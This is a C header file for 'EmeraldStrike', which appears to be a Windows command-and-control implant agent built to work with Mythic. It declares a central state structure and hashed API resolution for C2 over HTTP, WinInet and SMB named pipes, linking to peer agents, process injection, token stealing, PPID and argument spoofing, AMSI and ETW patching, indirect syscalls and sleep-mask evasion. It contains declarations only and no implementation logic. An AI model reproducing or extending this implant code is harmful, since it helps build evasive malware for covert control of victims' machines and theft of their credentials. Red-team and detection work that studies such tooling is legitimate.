#ifndef EMERALDSTRIKE_COMMON_H
#define EMERALDSTRIKE_COMMON_H

#include <windows.h>
#include <tlhelp32.h>
#include "native.h"
#include "beacon.h"
#include "beacon_gate.h"
#include "evasion/beacon_gate_impl.h"
#include "obfstr.h"

// NT_SYSCALL type definition for INSTANCE struct (also guarded in hellshall.h)
#ifdef INCLUDE_EVASION_HELLSHALL
#ifndef _NT_SYSCALL_DEFINED
#define _NT_SYSCALL_DEFINED
typedef struct _NT_SYSCALL {
    DWORD   dwSSn;
    PVOID   pSyscallAddress;
    PVOID   pSyscallInstAddress;
} NT_SYSCALL, *PNT_SYSCALL;
#endif
#endif
#include "stackstr.h"

#define DLL_BEACON_START     0x04
#define ES_VERSION           0x041300

// Hashing
#define H_MAGIC_KEY  8527
#define H_MAGIC_SEED 7

// Hash macros
#define HASH_STR(s) _hash_string(s)

typedef struct _BUFFER {
    PVOID  Buffer;
    ULONG  Length;
} BUFFER, *PBUFFER;

// API resolution function types
typedef HMODULE (WINAPI *fnLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *fnVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef HANDLE  (WINAPI *fnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD   (WINAPI *fnWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL    (WINAPI *fnCloseHandle)(HANDLE);
typedef VOID    (WINAPI *fnSleep)(DWORD);
typedef VOID    (WINAPI *fnExitProcess)(UINT);
typedef VOID    (WINAPI *fnExitThread)(DWORD);
typedef DWORD   (WINAPI *fnGetLastError)(VOID);
typedef HANDLE  (WINAPI *fnGetProcessHeap)(VOID);
typedef LPVOID  (WINAPI *fnHeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef LPVOID  (WINAPI *fnHeapReAlloc)(HANDLE, DWORD, LPVOID, SIZE_T);
typedef BOOL    (WINAPI *fnHeapFree)(HANDLE, DWORD, LPVOID);
typedef int     (WINAPI *fnMultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);

// WinHTTP types
typedef PVOID HINTERNET;
typedef HINTERNET (WINAPI *fnWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *fnWinHttpConnect)(HINTERNET, LPCWSTR, WORD, DWORD);
typedef HINTERNET (WINAPI *fnWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL      (WINAPI *fnWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL      (WINAPI *fnWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL      (WINAPI *fnWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
typedef BOOL      (WINAPI *fnWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL      (WINAPI *fnWinHttpCloseHandle)(HINTERNET);
typedef BOOL      (WINAPI *fnWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
typedef BOOL      (WINAPI *fnWinHttpAddRequestHeaders)(HINTERNET, LPCWSTR, DWORD, DWORD);

// WinInet types
typedef HINTERNET (WINAPI *fnInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *fnInternetConnectA)(HINTERNET, LPCSTR, WORD, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef HINTERNET (WINAPI *fnHttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
typedef BOOL      (WINAPI *fnHttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL      (WINAPI *fnInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL      (WINAPI *fnInternetCloseHandle)(HINTERNET);
typedef BOOL      (WINAPI *fnInternetSetOptionA)(HINTERNET, DWORD, LPVOID, DWORD);

// SMB pipe types
typedef HANDLE (WINAPI *fnCreateNamedPipeA)(LPCSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES);
typedef BOOL   (WINAPI *fnConnectNamedPipe)(HANDLE, LPOVERLAPPED);
typedef HANDLE (WINAPI *fnCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *fnWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fnDisconnectNamedPipe)(HANDLE);
typedef BOOL   (WINAPI *fnPeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);

// Debug
typedef VOID   (WINAPI *fnOutputDebugStringA)(LPCSTR);

// Process/token API types
typedef BOOL   (WINAPI *fnOpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef HANDLE (WINAPI *fnGetCurrentProcess)(VOID);
typedef DWORD  (WINAPI *fnGetCurrentProcessId)(VOID);
typedef BOOL   (WINAPI *fnGetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
typedef BOOL   (WINAPI *fnLookupAccountSidA)(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
typedef BOOL   (WINAPI *fnCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL   (WINAPI *fnTerminateProcess)(HANDLE, UINT);
typedef HANDLE (WINAPI *fnOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL   (WINAPI *fnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

// File API types
typedef HANDLE (WINAPI *fnFindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *fnFindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *fnFindClose)(HANDLE);
typedef DWORD  (WINAPI *fnGetCurrentDirectoryA)(DWORD, LPSTR);
typedef BOOL   (WINAPI *fnSetCurrentDirectoryA)(LPCSTR);
typedef BOOL   (WINAPI *fnCopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef BOOL   (WINAPI *fnMoveFileA)(LPCSTR, LPCSTR);
typedef BOOL   (WINAPI *fnDeleteFileA)(LPCSTR);
typedef BOOL   (WINAPI *fnCreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef BOOL   (WINAPI *fnRemoveDirectoryA)(LPCSTR);
typedef DWORD  (WINAPI *fnGetFileSize)(HANDLE, LPDWORD);
typedef DWORD  (WINAPI *fnGetFileAttributesA)(LPCSTR);

// Injection API types
typedef LPVOID   (WINAPI *fnVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef DWORD    (WINAPI *fnQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef DWORD    (WINAPI *fnResumeThread)(HANDLE);
typedef NTSTATUS (NTAPI  *fnNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

// Spawn/process creation API types
typedef BOOL   (WINAPI *fnCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef NTSTATUS (NTAPI *fnNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *fnNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fnNtUnmapViewOfSection)(HANDLE, PVOID);

// Beacon Gate API types
typedef BOOL    (WINAPI *fnVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *fnGetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL    (WINAPI *fnSetThreadContext)(HANDLE, const CONTEXT*);
typedef HANDLE  (WINAPI *fnCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE  (WINAPI *fnOpenThread)(DWORD, BOOL, DWORD);
typedef HANDLE  (WINAPI *fnCreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID  (WINAPI *fnMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL    (WINAPI *fnUnmapViewOfFile)(LPCVOID);
typedef SIZE_T  (WINAPI *fnVirtualQuery)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
typedef BOOL    (WINAPI *fnDuplicateHandle)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
typedef BOOL    (WINAPI *fnReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef BOOL    (WINAPI *fnVirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
typedef SIZE_T  (WINAPI *fnVirtualQueryEx)(HANDLE, LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);

// Snapshot API types
typedef HANDLE (WINAPI *fnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL   (WINAPI *fnProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL   (WINAPI *fnProcess32Next)(HANDLE, LPPROCESSENTRY32);

// Misc types
typedef int    (WINAPI *fnlstrlenA)(LPCSTR);
typedef LPSTR  (WINAPI *fnlstrcpyA)(LPSTR, LPCSTR);
typedef int    (WINAPI *fnlstrcmpA)(LPCSTR, LPCSTR);
typedef DWORD  (WINAPI *fnGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
typedef BOOL   (WINAPI *fnGetComputerNameExA)(COMPUTER_NAME_FORMAT, LPSTR, LPDWORD);
typedef VOID   (WINAPI *fnGetSystemInfo)(LPSYSTEM_INFO);
typedef VOID   (WINAPI *fnGetNativeSystemInfo)(LPSYSTEM_INFO);

// Instance structure - central state for the PIC agent
typedef struct _INSTANCE {
    BUFFER Base;

    struct {
        fnLoadLibraryA          LoadLibraryA;
        fnGetProcAddress        GetProcAddress;
        fnVirtualAlloc          VirtualAlloc;
        fnVirtualProtect        VirtualProtect;
        fnVirtualFree           VirtualFree;
        fnCreateThread          CreateThread;
        fnWaitForSingleObject   WaitForSingleObject;
        fnCloseHandle           CloseHandle;
        fnSleep                 Sleep;
        fnExitProcess           ExitProcess;
        fnExitThread            ExitThread;
        fnGetLastError          GetLastError;
        fnGetProcessHeap        GetProcessHeap;
        fnHeapAlloc             HeapAlloc;
        fnHeapReAlloc           HeapReAlloc;
        fnHeapFree              HeapFree;
        fnMultiByteToWideChar   MultiByteToWideChar;

        // WinHTTP
        fnWinHttpOpen               WinHttpOpen;
        fnWinHttpConnect            WinHttpConnect;
        fnWinHttpOpenRequest        WinHttpOpenRequest;
        fnWinHttpSendRequest        WinHttpSendRequest;
        fnWinHttpReceiveResponse    WinHttpReceiveResponse;
        fnWinHttpQueryDataAvailable WinHttpQueryDataAvailable;
        fnWinHttpReadData           WinHttpReadData;
        fnWinHttpCloseHandle        WinHttpCloseHandle;
        fnWinHttpSetOption          WinHttpSetOption;
        fnWinHttpAddRequestHeaders  WinHttpAddRequestHeaders;

        // WinInet
        fnInternetOpenA         InternetOpenA;
        fnInternetConnectA      InternetConnectA;
        fnHttpOpenRequestA      HttpOpenRequestA;
        fnHttpSendRequestA      HttpSendRequestA;
        fnInternetReadFile      InternetReadFile;
        fnInternetCloseHandle   InternetCloseHandle;
        fnInternetSetOptionA    InternetSetOptionA;

        // SMB
        fnCreateNamedPipeA    CreateNamedPipeA;
        fnConnectNamedPipe    ConnectNamedPipe;
        fnCreateFileA         CreateFileA;
        fnWriteFile           WriteFile;
        fnReadFile            ReadFile;
        fnDisconnectNamedPipe DisconnectNamedPipe;
        fnPeekNamedPipe       PeekNamedPipe;

        // Process/Token
        fnOpenProcessToken     OpenProcessToken;
        fnGetCurrentProcess    GetCurrentProcess;
        fnGetCurrentProcessId  GetCurrentProcessId;
        fnGetTokenInformation  GetTokenInformation;
        fnLookupAccountSidA    LookupAccountSidA;
        fnCreateProcessA       CreateProcessA;
        fnTerminateProcess     TerminateProcess;
        fnOpenProcess          OpenProcess;
        fnWriteProcessMemory   WriteProcessMemory;
        fnVirtualAllocEx       VirtualAllocEx;
        fnNtCreateThreadEx     NtCreateThreadEx;
        fnQueueUserAPC         QueueUserAPC;
        fnResumeThread         ResumeThread;
        fnCreateProcessW       CreateProcessW;

        // Ntdll (section injection)
        fnNtCreateSection      NtCreateSection;
        fnNtMapViewOfSection   NtMapViewOfSection;
        fnNtUnmapViewOfSection NtUnmapViewOfSection;

        // Beacon Gate APIs
        fnVirtualProtectEx     VirtualProtectEx;
        fnGetThreadContext     GetThreadContext;
        fnSetThreadContext     SetThreadContext;
        fnCreateRemoteThread   CreateRemoteThread;
        fnOpenThread           OpenThread;
        fnCreateFileMappingA   CreateFileMappingA;
        fnMapViewOfFile        MapViewOfFile;
        fnUnmapViewOfFile      UnmapViewOfFile;
        fnVirtualQuery         VirtualQuery;
        fnDuplicateHandle      DuplicateHandle;
        fnReadProcessMemory    ReadProcessMemory;
        fnVirtualFreeEx        VirtualFreeEx;
        fnVirtualQueryEx       VirtualQueryEx;

        // File
        fnFindFirstFileA       FindFirstFileA;
        fnFindNextFileA        FindNextFileA;
        fnFindClose            FindClose;
        fnGetCurrentDirectoryA GetCurrentDirectoryA;
        fnSetCurrentDirectoryA SetCurrentDirectoryA;
        fnCopyFileA            CopyFileA;
        fnMoveFileA            MoveFileA;
        fnDeleteFileA          DeleteFileA;
        fnCreateDirectoryA     CreateDirectoryA;
        fnRemoveDirectoryA     RemoveDirectoryA;
        fnGetFileSize          GetFileSize;
        fnGetFileAttributesA   GetFileAttributesA;

        // Snapshot
        fnCreateToolhelp32Snapshot CreateToolhelp32Snapshot;
        fnProcess32First           Process32First;
        fnProcess32Next            Process32Next;

        // Misc
        fnlstrlenA             lstrlenA;
        fnlstrcpyA             lstrcpyA;
        fnlstrcmpA             lstrcmpA;
        fnGetModuleFileNameA   GetModuleFileNameA;
        fnGetComputerNameExA   GetComputerNameExA;
        fnGetSystemInfo        GetSystemInfo;
        fnGetNativeSystemInfo  GetNativeSystemInfo;
        fnOutputDebugStringA   OutputDebugStringA;
    } Win32;

    struct {
        PVOID Ntdll;
        PVOID Kernel32;
        PVOID Winhttp;
        PVOID Wininet;
        PVOID Advapi32;
    } Modules;

    // Agent config parsed from CONFIG_BYTES
    struct {
        char     uuid[37];
        BYTE     aes_key[32];
        DWORD    sleep_ms;
        DWORD    jitter;
        DWORD    killdate;
    } Config;

    // HTTP config
    struct {
        char     host[256];
        DWORD    port;
        BYTE     use_ssl;
        char     user_agent[256];
        char     get_uri[256];
        char     post_uri[256];
        char     query_param[64];
        BYTE     use_proxy;
        char     proxy_host[256];
        DWORD    proxy_port;
        char     proxy_user[128];
        char     proxy_pass[128];
    } Http;

    // SMB config
    struct {
        char     pipename[256];
        HANDLE   pipe;                  // server pipe handle
        BYTE     link_key[32];          // active link-client session key (client's payload AES key)
        BOOL     have_link_key;
    } Smb;

    // Linked P2P peers (link/unlink) - client-side registry of agents we linked to
#define ES_MAX_LINKED_PEERS 8
    struct {
        char   host[256];
        char   pipename[256];
        char   uuid[37];
        HANDLE pipe;
        BOOL   active;
        BOOL   checkin_sent;   // delegate checkin sent to Mythic via ACTION_LINK_ADD
        BYTE*  delegate_checkin_b64;  // base64 encoded encrypted checkin blob from peer
        DWORD  delegate_checkin_b64_len;
    } LinkedPeers[ES_MAX_LINKED_PEERS];
    DWORD  LinkedPeerCount;

    // Pending action-byte messages queued by cmd_link/cmd_unlink for the main loop to send
#define ES_MAX_PENDING_MSGS 16
    struct {
        BYTE*  data;
        DWORD  len;
    } PendingMsgs[ES_MAX_PENDING_MSGS];
    DWORD  PendingMsgCount;

    // UDRL user data (savedUserData is a by-value copy; pUserData points to it)
    USER_DATA   savedUserData;
    PUSER_DATA  pUserData;

    // Beacon info for sleepmask
    BEACON_INFO BeaconInfo;

    // External sleepmask (UDRL mode)
    PVOID  pfnSleepMask;
    PVOID  pSleepMaskBase;
    BOOL   bSleepMaskLoaded;
    DWORD  dwSleepMaskTextSize;

    // Beacon Gate state
    BOOL   bBeaconGateEnabled;
    BOOL   bBeaconGateMasking;

    // Key/Value store for BOFs
    struct {
        DWORD   hash;
        PVOID   ptr;
    } KvStore[64];
    DWORD KvCount;

    // Data store
    DATA_STORE_OBJECT DataStore[16];
    DWORD DataStoreCount;

    // BOF output buffer
    char*  BofOutput;
    DWORD  BofOutputLen;
    DWORD  BofOutputCap;

    // Agent state
    BOOL   Running;
    BOOL   Connected;

    // Spawnto - sacrifice process paths for fork-and-run
    struct {
        char x64[260];
        char x86[260];
        char x64_args[260];
        char x86_args[260];
    } Spawnto;

    // Argument spoofing (argue command)
    char*  argue_args;
    DWORD  argue_len;

    // Token ops (make_token/steal_token/rev2self)
    HANDLE ImpersonationToken;

    // ppid spoof target (0 = disabled); consumed by spawn/shell CreateProcess
    DWORD  SpoofPPID;

    // blockdlls: block non-Microsoft DLLs for future spawned processes
    BOOL   BlockDlls;

    // CLR/PowerShell pipe state (shared by execute_assembly and powerpick)
    HANDLE ClrPipeRead;
    HANDLE ClrPipeWrite;
    BOOL   ClrStdoutRedirected;

    // Cleanup: tracks the initial shellcode allocation for post-load cleanup
    PVOID  pOriginalAlloc;
    SIZE_T szOriginalAlloc;

    // Exit function: 0 = ExitThread (default), 1 = ExitProcess
    DWORD  ExitFunc;

#ifdef INCLUDE_EVASION_HELLSHALL
    // ─── HellsHall indirect syscalls ───
    NT_SYSCALL HH_Syscalls[16];           // Resolved syscall descriptors (HH_MAX_SYSCALLS)
    BOOL   bHellsHallInit;                // TRUE if all syscalls resolved successfully
#endif

#if SLEEP_MASK_TYPE == MASK_EKKO
    // ─── Ekko sleep state ───
    BYTE   EkkoKey[16];                   // RC4 key for SystemFunction032
    BOOL   bEkkoInitialized;              // TRUE after first Ekko call
#endif

} INSTANCE, *PINSTANCE;

// Global instance (resolved via PIC pattern)
EXTERN_C ULONG __Instance_offset;
EXTERN_C PVOID __Instance;

#define EMERALDSTRIKE_INSTANCE  ((PINSTANCE)((PBYTE)_get_instance()))

EXTERN_C PVOID _get_instance(VOID);

// API resolution
DWORD hash_string_djb2(const char* str);
DWORD hash_string_djb2_w(const wchar_t* str);
PVOID resolve_module_peb(DWORD hash);
PVOID resolve_function(PVOID module, DWORD hash);
VOID  resolve_apis(PINSTANCE inst);

// Entry points
VOID agent_init(PINSTANCE inst, HINSTANCE hDll);
VOID agent_main(PINSTANCE inst);

// Sleepmask COFF loader (UDRL mode)
BOOL sleepmask_load_coff(PINSTANCE inst, BYTE* coff_data, DWORD coff_size, const char* entry_name);

// Evasion patches
#ifdef INCLUDE_EVASION_AMSI
VOID patch_amsi(PINSTANCE inst);
#endif
#ifdef INCLUDE_EVASION_ETW
VOID patch_etw(PINSTANCE inst);
#endif
#ifdef INCLUDE_EVASION_HELLSHALL
BOOL hellshall_init(PINSTANCE inst);
#endif

// Config parsing
VOID parse_config(PINSTANCE inst, const BYTE* buf, DWORD len);

// Memory helpers
PVOID es_malloc(PINSTANCE inst, SIZE_T size);
PVOID es_realloc(PINSTANCE inst, PVOID ptr, SIZE_T size);
VOID  es_free(PINSTANCE inst, PVOID ptr);
VOID  es_memcpy(PVOID dst, const PVOID src, SIZE_T len);
VOID  es_memset(PVOID dst, int val, SIZE_T len);
int   es_strcmp(const char* a, const char* b);
int   es_strlen(const char* s);
VOID  es_strcpy(char* dst, const char* src);

#ifdef DEBUG
// TEMP DIAGNOSTIC: file-based stage tracing (OutputDebugString is not capturable
// over this test harness). Defined in main.cc.
VOID es_dbg_trace(PINSTANCE inst, const char* msg);
#define TRACE(inst, m) es_dbg_trace(inst, m)
#else
#define TRACE(inst, m) ((void)0)
#endif

#ifdef DEBUG
#define DBG(inst, tag) do { if ((inst)->Win32.OutputDebugStringA) { (inst)->Win32.OutputDebugStringA(tag); (inst)->Win32.OutputDebugStringA("\n"); } } while(0)
#else
#define DBG(inst, tag) ((void)0)
#endif

#endif // EMERALDSTRIKE_COMMON_H
